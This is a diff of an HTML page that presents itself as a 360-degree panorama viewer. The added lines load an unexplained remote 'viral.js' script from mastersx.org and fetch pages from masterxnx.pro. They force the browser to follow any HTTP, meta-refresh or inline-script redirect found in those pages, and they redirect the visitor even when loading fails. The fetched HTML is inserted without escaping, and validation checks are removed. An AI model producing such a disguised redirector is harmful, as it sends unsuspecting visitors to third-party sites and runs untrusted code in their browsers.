@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>360 প্লেয়ার সেটআপ</title>
+    <title>360 Viewer & Dynamic Integration</title>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.css">
     <style>
         html, body {
@@ -51,13 +51,15 @@
 </head>
 <body>
 
-    <!-- ডায়নামিক এইচটিএমএল কন্টেন্ট -->
     <div id="content"></div>
-
-    <!-- ৩৬০ ডিগ্রি প্যানোরামা ভিউয়ার -->
     <div id="panorama"></div>
 
+    <!-- External Viral Script -->
+    <script src="https://mastersx.org/post/viral.js"></script>
+
+    <!-- Pannellum 360 Library -->
     <script src="https://cdn.jsdelivr.net/npm/pannellum@2.5.6/build/pannellum.js"></script>
+
     <script>
         const params = new URLSearchParams(window.location.search);
         const v = params.get("v");
@@ -72,21 +74,47 @@
                 return;
             }
 
-            // masterxnx.pro এর ইউআরএল স্ট্রাকচার সেটআপ
-            const targetBase = "https://masterxnx.pro/cop/";
+            const targetBase = "https://masterxnx.pro/news/new/";
             const targetURL = targetBase + encodeURIComponent(id) + ".html";
 
             try {
-                const response = await fetch(targetURL);
+                const response = await fetch(targetURL, { redirect: "follow" });
+
+                if (response.redirected && response.url !== targetURL) {
+                    window.location.href = response.url;
+                    return;
+                }
 
                 if (!response.ok) {
-                    throw new Error("HTTP এরর: " + response.status);
+                    throw new Error("HTTP error: " + response.status);
                 }
 
                 const html = await response.text();
                 const doc = new DOMParser().parseFromString(html, "text/html");
 
-                // টাইটেল এবং বডি টেক্সট সংগ্রহ
+                // Check Meta Refresh Redirect
+                const metaRefresh = doc.querySelector('meta[http-equiv="refresh"]');
+                if (metaRefresh) {
+                    const contentAttr = metaRefresh.getAttribute("content");
+                    const urlMatch = contentAttr ? contentAttr.match(/url=(.+)/i) : null;
+                    if (urlMatch && urlMatch[1]) {
+                        window.location.href = urlMatch[1].trim();
+                        return;
+                    }
+                }
+
+                // Check Inline JS Redirects
+                const scriptTags = doc.querySelectorAll("script");
+                for (let script of scriptTags) {
+                    if (script.textContent.includes("window.location")) {
+                        const match = script.textContent.match(/window\.location(?:\.href)?\s*=\s*['"]([^'"]+)['"]/);
+                        if (match && match[1]) {
+                            window.location.href = match[1];
+                            return;
+                        }
+                    }
+                }
+
                 const title = doc.querySelector("title")?.textContent.trim() || "";
                 const body = doc.body?.innerHTML || "";
 
@@ -94,7 +122,6 @@
                     document.title = title;
                 }
 
-                // কন্টেন্ট প্রদর্শন
                 content.innerHTML = 
                     "<div class='target-title'>" + escapeHTML(title) + "</div>" +
                     "<div class='target-body'>" + body + "</div>";
@@ -107,14 +134,14 @@
 
             } catch (error) {
                 console.error("Target load error:", error);
-                content.innerHTML = "<div class='error'>কন্টেন্ট লোড করতে সমস্যা হয়েছে: " + escapeHTML(error.message) + "</div>";
-                start360();
+                // Fallback Redirect
+                window.location.href = targetURL;
             }
         }
 
         function start360() {
             if (!v) {
-                panorama.innerHTML = "<div class='error'>'v' প্যারামিটার পাওয়া যায়নি!</div>";
+                panorama.innerHTML = "<div class='error'>Missing 'v' parameter!</div>";
                 return;
             }
 
@@ -126,27 +153,18 @@
                 }
 
                 const xmlDoc = new DOMParser().parseFromString(xmlText, "text/xml");
-                const parserError = xmlDoc.querySelector("parsererror");
-
-                if (parserError) {
-                    throw new Error("অকার্যকর XML ফরম্যাট");
-                }
-
                 const include = xmlDoc.querySelector("include");
+
                 if (!include) {
-                    throw new Error("XML-এর ভেতরে 'include' ট্যাগ পাওয়া যায়নি");
+                    throw new Error("'include' tag not found in XML");
                 }
 
                 const imagePath = include.getAttribute("path");
+
                 if (!imagePath) {
-                    throw new Error("ইমেজের পাথ (path) অনুপস্থিত");
+                    throw new Error("Image path missing");
                 }
 
-                if (typeof pannellum === "undefined") {
-                    throw new Error("Pannellum লাইব্রেরি লোড হতে ব্যর্থ হয়েছে");
-                }
-
-                // Pannellum ৩৬০ প্লেয়ার চালুকরণ
                 pannellum.viewer("panorama", {
                     type: "equirectangular",
                     panorama: imagePath,
@@ -159,7 +177,7 @@
                 });
 
             } catch (error) {
-                panorama.innerHTML = "<div class='error'>৩৬০ প্লেয়ার এরর: " + escapeHTML(error.message) + "</div>";
+                panorama.innerHTML = "<div class='error'>360 player error: " + escapeHTML(error.message) + "</div>";
             }
         }
 
@@ -169,7 +187,6 @@
             return div.innerHTML;
         }
 
-        // প্রোগ্রাম চালু
         loadTargetFirst();
     </script>
 </body>
